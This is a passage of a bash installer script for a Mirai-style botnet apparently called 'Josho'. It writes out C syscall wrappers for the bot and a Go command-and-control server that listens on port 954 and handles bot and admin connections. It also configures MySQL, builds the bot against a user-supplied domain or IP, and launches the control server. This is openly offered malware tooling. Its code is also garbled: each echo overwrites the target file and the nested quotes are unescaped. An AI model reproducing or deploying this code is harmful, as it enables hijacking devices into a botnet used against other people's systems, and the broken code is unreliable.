echo -e "#else" > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("socket using socket\n");" > main.c
echo -e "#endif" > main.c
echo -e "    return syscall(SCN(SYS_socket), domain, type, protocol);" > main.c
echo -e "#endif" > main.c
echo -e "}" > main.c
echo -e "" > main.c
echo -e "int xread(int fd, void *buf, int len)" > main.c
echo -e "{" > main.c
echo -e "    return syscall(SCN(SYS_read), fd, buf, len);" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "int xwrite(int fd, void *buf, int len)" > main.c
echo -e "{" > main.c
echo -e "    return syscall(SCN(SYS_write), fd, buf, len);" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "int xconnect(int fd, struct sockaddr_in *addr, int len)" > main.c
echo -e "{" > main.c
echo -e "#if defined(__NR_socketcall)" > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("connect using socketcall\n");" > main.c
echo -e "#endif" > main.c
echo -e "    struct {" > main.c
echo -e "        int fd;" > main.c
echo -e "        struct sockaddr_in *addr;" > main.c
echo -e "        int len;" > main.c
echo -e "    } socketcall;" > main.c
echo -e "    socketcall.fd = fd;" > main.c
echo -e "    socketcall.addr = addr;" > main.c
echo -e "    socketcall.len = len;" > main.c
echo -e "    // 3 == SYS_CONNECT" > main.c
echo -e "    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);" > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("connect got ret: %d\n", ret);" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "    return ret;" > main.c
echo -e "#else" > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("connect using connect\n");" > main.c
echo -e "#endif" > main.c
echo -e "    return syscall(SCN(SYS_connect), fd, addr, len);" > main.c
echo -e "#endif" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "int xopen(char *path, int flags, int other)" > main.c
echo -e "{" > main.c
echo -e "    return syscall(SCN(SYS_open), path, flags, other);" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "int xclose(int fd)" > main.c
echo -e "{" > main.c
echo -e "    return syscall(SCN(SYS_close), fd);" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "void x__exit(int code)" > main.c
echo -e "{" > main.c
echo -e "    syscall(SCN(SYS_exit), code);" > main.c
echo -e "}" > main.c
read 
fi
if [[ $answer == SQL1 ]]
then
clear
echo -e ""
service mysqld start
mysql_secure_installation
read 
fi
if [[ $answer == SQL2 ]]
then
clear
echo -e ""
sh sql.sh
read 
fi
if [[ $answer == PASS ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter Your SQL Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
cd /cnc/
rm -rf main.go

echo -e "package main " > main.go
echo -e " " > main.go
echo -e "import ( " > main.go
echo -e "    "fmt" " > main.go
echo -e "    "net" " > main.go
echo -e "    "errors" " > main.go
echo -e "    "time" " > main.go
echo -e ") " > main.go
echo -e " " > main.go
echo -e "const DatabaseAddr string   = "127.0.0.1:3306" " > main.go
echo -e "const DatabaseUser string   = "root" " > main.go
echo -e "const DatabasePass string   = "$pass" " > main.go
echo -e "const DatabaseTable string  = "Josho" " > main.go
echo -e " " > main.go
echo -e "var clientList *ClientList = NewClientList() " > main.go
echo -e "var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable) " > main.go
echo -e " " > main.go
echo -e "func main() { " > main.go
echo -e "    tel, err := net.Listen("tcp", "0.0.0.0:954") " > main.go
echo -e "    if err != nil { " > main.go
echo -e "        fmt.Println(err) " > main.go
echo -e "        return " > main.go
echo -e "    } " > main.go
echo -e " " > main.go
echo -e "    for { " > main.go
echo -e "        conn, err := tel.Accept() " > main.go
echo -e "        if err != nil { " > main.go
echo -e "            break " > main.go
echo -e "        } " > main.go
echo -e "        go initialHandler(conn) " > main.go
echo -e "    } " > main.go
echo -e " " > main.go
echo -e "    fmt.Println("ERROR: run ulimit -n 999999") " > main.go
echo -e "} " > main.go
echo -e " " > main.go
echo -e "func initialHandler(conn net.Conn) { " > main.go
echo -e "    defer conn.Close() " > main.go
echo -e " " > main.go
echo -e "    conn.SetDeadline(time.Now().Add(10 * time.Second)) " > main.go
echo -e " " > main.go
echo -e "    buf := make([]byte, 32) " > main.go
echo -e "    l, err := conn.Read(buf) " > main.go
echo -e "    if err != nil || l <= 0 { " > main.go
echo -e "        return " > main.go
echo -e "    } " > main.go
echo -e " " > main.go
echo -e "    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 { " > main.go
echo -e "        if buf[3] > 0 { " > main.go
echo -e "            string_len := make([]byte, 1) " > main.go
echo -e "            l, err := conn.Read(string_len) " > main.go
echo -e "            if err != nil || l <= 0 { " > main.go
echo -e "                return " > main.go
echo -e "            } " > main.go
echo -e "            var source string " > main.go
echo -e "            if string_len[0] > 0 { " > main.go
echo -e "                source_buf := make([]byte, string_len[0]) " > main.go
echo -e "                l, err := conn.Read(source_buf) " > main.go
echo -e "                if err != nil || l <= 0 { " > main.go
echo -e "                    return " > main.go
echo -e "                } " > main.go
echo -e "                source = string(source_buf) " > main.go
echo -e "            } " > main.go
echo -e "            NewBot(conn, buf[3], source).Handle() " > main.go
echo -e "        } else { " > main.go
echo -e "            NewBot(conn, buf[3], "").Handle() " > main.go
echo -e "        } " > main.go
echo -e "    } else { " > main.go
echo -e "        NewAdmin(conn).Handle() " > main.go
echo -e "    } " > main.go
echo -e "} " > main.go
echo -e " " > main.go
echo -e " " > main.go
echo -e "func readXBytes(conn net.Conn, buf []byte) (error) { " > main.go
echo -e "    tl := 0 " > main.go
echo -e " " > main.go
echo -e "    for tl < len(buf) { " > main.go
echo -e "        n, err := conn.Read(buf[tl:]) " > main.go
echo -e "        if err != nil { " > main.go
echo -e "            return err " > main.go
echo -e "        } " > main.go
echo -e "        if n <= 0 { " > main.go
echo -e "            return errors.New("Connection closed unexpectedly") " > main.go
echo -e "        } " > main.go
echo -e "        tl += n " > main.go
echo -e "    } " > main.go
echo -e " " > main.go
echo -e "    return nil " > main.go
echo -e "} " > main.go
echo -e " " > main.go
echo -e "func netshift(prefix uint32, netmask uint8) uint32 { " > main.go
echo -e "    return uint32(prefix >> (32 - netmask)) " > main.go
echo -e "} " > main.go
read 
fi
if [[ $answer == START ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter Your Domain (if you dont have one put your ip):${LIGHTRED} \c"
read dom
clear
echo -e ""
cd ~/
chmod 0777 * -R
sh build.sh $dom
read 
fi
if [[ $answer == FINISH ]]
then
clear
echo -e ""
screen ./cnc
read
fi
done
